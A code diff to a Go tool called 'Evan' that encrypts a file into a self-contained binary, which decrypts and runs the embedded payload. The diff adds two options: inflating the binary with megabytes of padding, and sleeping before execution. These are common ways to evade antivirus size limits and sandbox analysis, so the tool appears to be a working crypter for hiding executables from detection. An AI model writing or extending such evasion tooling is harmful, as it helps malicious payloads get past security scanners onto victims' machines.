@@ -13,6 +13,7 @@ import (
 	"runtime"
 	"strconv"
 	"strings"
+	"time"
 )
 
 const (
@@ -25,8 +26,8 @@ const usageText = `Evan Program Usage:
   --encrypt <target-file>     encrypt a file and produce a self-contained binary
   --output <name>             name of the produced binary (default: <target>_enc)
   --run <enc> <key>           decrypt and execute a payload (uses .enc + .key on disk)
-  --add-size <size-in-mb>     (reserved)
-  --delay <seconds>           (reserved)`
+  --add-size <size-in-mb>     pad the produced binary by N MB
+  --delay <seconds>           delay execution by N seconds`
 
 // ---------------------------------------------------------------------------
 // AES-256-GCM. On-disk format: nonce (12) || tag (16) || ciphertext
@@ -189,7 +190,7 @@ func buildC(encryptedPath, keyPath string, args []string) error {
 // Self-contained compiler: embeds blob + key into a new Go binary
 // ---------------------------------------------------------------------------
 
-func compileSelfContained(blob, key []byte, outputName, outputDir string) error {
+func compileSelfContained(blob, key []byte, outputName, outputDir string, addSizeMB, delaySec float64) error {
 	if _, err := exec.LookPath("go"); err != nil {
 		return fmt.Errorf("go toolchain not found in PATH: %w", err)
 	}
@@ -205,7 +206,17 @@ func compileSelfContained(blob, key []byte, outputName, outputDir string) error 
 		return err
 	}
 
+	// Optional padding file embedded with //go:embed to increase binary size.
+	padBytes := int(addSizeMB * 1024 * 1024)
+	if padBytes < 0 {
+		padBytes = 0
+	}
+	if err := os.WriteFile(filepath.Join(buildDir, "padding.bin"), make([]byte, padBytes), 0o644); err != nil {
+		return err
+	}
+
 	src := strings.Replace(runnerTemplate, "{{KEY}}", hex.EncodeToString(key), 1)
+	src = strings.Replace(src, "{{DELAY_MS}}", strconv.FormatInt(int64(delaySec*1000), 10), 1)
 	if err := os.WriteFile(filepath.Join(buildDir, "main.go"), []byte(src), 0o644); err != nil {
 		return err
 	}
@@ -246,12 +257,17 @@ import (
 	"os/exec"
 	"runtime"
 	"strings"
+	"time"
 )
 
 //go:embed payload.enc
 var payload []byte
 
+//go:embed padding.bin
+var _ []byte
+
 const embeddedKeyHex = "{{KEY}}"
+const delayMs = {{DELAY_MS}}
 
 const (
 	keySize   = 32
@@ -338,6 +354,9 @@ func runPlain(plain []byte, args []string) error {
 }
 
 func main() {
+	if delayMs > 0 {
+		time.Sleep(time.Duration(delayMs) * time.Millisecond)
+	}
 	plain, err := decryptEmbedded()
 	if err != nil {
 		fmt.Fprintln(os.Stderr, "error:", err)
@@ -401,6 +420,9 @@ func main() {
 			fmt.Fprintln(os.Stderr, "usage: evan --run <encrypted_path> <key_path> [payload args...]")
 			os.Exit(2)
 		}
+		if delay > 0 {
+			time.Sleep(time.Duration(float64(delay) * float64(time.Second)))
+		}
 		if err := buildC(pos[0], pos[1], pos[2:]); err != nil {
 			if ee, ok := err.(*exec.ExitError); ok {
 				os.Exit(ee.ExitCode())
@@ -442,7 +464,7 @@ func main() {
 		}
 
 		fmt.Printf("\nCompiling self-contained binary %q ...\n", binName)
-		if err := compileSelfContained(blob, key, binName, "."); err != nil {
+		if err := compileSelfContained(blob, key, binName, ".", float64(addSize), float64(delay)); err != nil {
 			fmt.Fprintf(os.Stderr, "Compile error: %v\n", err)
 			os.Exit(1)
 		}
